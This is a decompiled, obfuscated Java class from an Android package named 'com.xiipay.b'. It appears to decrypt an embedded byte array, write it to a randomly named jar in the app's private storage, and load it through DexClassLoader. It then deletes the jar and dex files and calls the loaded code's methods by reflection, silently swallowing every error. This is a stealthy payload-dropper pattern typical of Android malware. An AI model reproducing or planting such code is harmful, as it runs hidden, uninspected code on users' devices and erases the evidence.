package com.xiipay.b;

import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;

public class d
{
  private byte[] a;
  private String b;
  private String c;
  private Context d;
  
  public d(Context paramContext, byte[] paramArrayOfByte, String paramString1, String paramString2)
  {
    this.a = paramArrayOfByte;
    this.b = paramString1;
    this.d = paramContext;
    this.c = paramString2;
  }
  
  private static Object a(File paramFile, String paramString)
  {
    try
    {
      paramFile = new DexClassLoader(paramFile.getAbsolutePath(), paramFile.getParentFile().getAbsolutePath(), null, d.class.getClassLoader()).loadClass(paramString).newInstance();
      return paramFile;
    }
    catch (Exception paramFile) {}
    return null;
  }
  
  public final void a()
  {
    a.b(this.a);
    try
    {
      File localFile = this.d.getFilesDir();
      Object localObject2 = this.a;
      Object localObject3 = j.a();
      String str = this.b;
      Object localObject1 = new File(localFile, localObject3 + ".jar");
      localFile = new File(localFile, localObject3 + ".dex");
      localObject3 = new FileOutputStream((File)localObject1);
      ((FileOutputStream)localObject3).write((byte[])localObject2);
      ((FileOutputStream)localObject3).flush();
      ((FileOutputStream)localObject3).close();
      localObject2 = a((File)localObject1, str);
      ((File)localObject1).delete();
      localFile.delete();
      localObject1 = new c(localObject2);
      ((c)localObject1).a("p", new Class[] { String.class });
      ((c)localObject1).a("c", new Class[] { Context.class });
      ((c)localObject1).a("a", new Class[0]);
      ((c)localObject1).a("p", new Object[] { this.c });
      ((c)localObject1).a("c", new Object[] { this.d });
      ((c)localObject1).a("a", new Object[0]);
      return;
    }
    catch (Exception localException) {}
  }
}
